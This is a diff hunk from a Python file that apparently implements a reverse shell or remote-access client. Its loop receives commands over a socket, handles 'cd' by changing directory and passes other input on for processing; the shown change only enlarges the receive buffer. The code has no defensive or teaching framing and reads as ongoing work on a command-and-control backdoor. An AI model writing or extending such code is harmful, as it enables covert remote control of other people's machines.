@@ -19,7 +19,7 @@ def connect_socket():
 def recv_cmds_send_response():
 
     while True:
-        data = s.recv(1024)
+        data = s.recv(2048)
         if data[:2].decode("utf-8") == "cd":
             os.chdir(data[3:].decode("utf-8"))
         if len(data) > 0 and (not(data[:2].decode("utf-8") == "cd")):
